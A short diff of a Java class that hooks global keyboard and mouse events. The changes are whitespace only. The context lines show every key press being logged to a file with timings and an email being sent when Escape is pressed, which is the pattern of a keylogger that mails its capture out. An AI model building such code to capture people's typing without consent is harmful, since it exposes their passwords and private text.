@@ -36,13 +36,12 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
         FileManager fm = new FileManager();
         fm.write("Key,Pressed," + t + "," + e.getKeyText(e.getKeyCode()));
         this.startTime = System.nanoTime();
-        
-        
+
         if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
             EmailManager email = new EmailManager();
             email.enviarCorreo();
         }
-        
+
     }
 
     @Override
@@ -56,7 +55,7 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
 
     @Override
     public void nativeMouseClicked(NativeMouseEvent e) {
-        
+
     }
 
     @Override
